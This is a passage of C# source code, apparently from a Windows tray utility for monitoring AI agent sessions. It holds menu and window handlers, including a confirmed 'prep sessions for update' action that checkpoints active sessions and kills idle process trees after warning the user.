            _connectWindow = w;
            w.Show();
        }
        WindowActivation.Surface(_connectWindow);
    }

    // "Prep sessions for update": cooperate with the living (ask active sessions to checkpoint), reap the abandoned
    // (kill idle trees), so an update or restart lands clean. Confirmed first - the reap kills processes.
    private void PrepSessionsForUpdateFromTray()
    {
        if (PrepSessionsForUpdate is null)
        {
            MessageBox.Show("Session prep isn't wired up yet.",
                "Foreman Agent Safety — Prep for update", MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        var confirm = MessageBox.Show(
            "Prepare agent sessions for an update or restart?\n\n" +
            $"• ACTIVE sessions are asked to checkpoint/commit and stop their child processes — they are NOT killed.\n" +
            $"• IDLE sessions (no I/O for {_settings.IdleCleanupAfterMinutes}+ min, configurable in Settings) are REAPED: " +
            "a hard kill of that session's process tree. Any UNSAVED work in them is lost. A session you are present at " +
            "but have not run anything in for that long counts as idle — save it first.\n\n" +
            "Each session is handled on its own, so an active session is spared even if another of the same type is idle. " +
            "Local-model hosts, disabled harnesses, and Foreman's own processes are left alone.\n\n" +
            "Note: reaped exits still appear in the event log (alert-suppression for them isn't wired yet).",
            "Foreman Agent Safety — Prep sessions for update",
            MessageBoxButton.OKCancel, MessageBoxImage.Warning);
        if (confirm != MessageBoxResult.OK) return;

        var (ok, msg) = PrepSessionsForUpdate();
        MessageBox.Show(msg, "Foreman Agent Safety — Prep sessions for update",
            MessageBoxButton.OK, ok ? MessageBoxImage.Information : MessageBoxImage.Warning);
    }

    private void OpenMuteManagerWindow()
    {
        if (_muteWindow is null)
        {
            var w = new MuteManagerWindow(_settings, () => SettingsStore.Save(_settings));
            w.Closed += (_, _) => _muteWindow = null;
            _muteWindow = w;
            w.Show();
        }
        WindowActivation.Surface(_muteWindow);
    }

    private static void AddMenuItem(ContextMenu menu, string header, Action? onClick, bool enabled = true)
    {
        var item = new MenuItem { Header = header, IsEnabled = enabled };
        if (onClick is not null)
            item.Click += (_, _) => onClick();
        menu.Items.Add(item);
    }

    private static string GetVersion() =>
        System.Reflection.Assembly.GetExecutingAssembly().GetName().Version?.ToString(3) ?? "0.1";

    public void Dispose()
    {
        _cadenceFlushTimer?.Stop();
        _gameMode?.Dispose();
        _dashboardWindow?.Close();   // disposes its hosted Process/Harness/Behavior/Log views
        _settingsWindow?.Close();
        _connectWindow?.Close();
        _muteWindow?.Close();
        _tray?.Dispose();
    }
}
